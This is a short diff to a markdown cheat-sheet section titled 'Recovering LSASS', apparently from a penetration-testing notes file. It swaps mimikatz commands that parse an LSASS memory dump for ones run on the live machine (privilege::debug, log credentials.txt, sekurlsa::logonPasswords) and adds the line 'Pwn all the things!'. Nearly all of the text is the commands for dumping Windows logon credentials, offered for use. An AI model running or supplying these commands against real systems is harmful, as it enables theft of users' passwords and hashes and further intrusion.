@@ -3,8 +3,8 @@
 ## Recovering LSASS
 ```
 Open an Administrative prompt
-mimikatz # privilege::debug and make sure we get '20' ok
-mimikatz # sekurlsa::minidump c:\tmp\lsass.dmp
-mimikatz # log credentials.txt
-mimikatz # sekurlsa::logonPasswords
+mimikatz.exe # privilege::debug
+mimikatz(commandline) log credentials.txt
+mimikatz(commandline) sekurlsa::logonPasswords
+Pwn all the things!
 ```
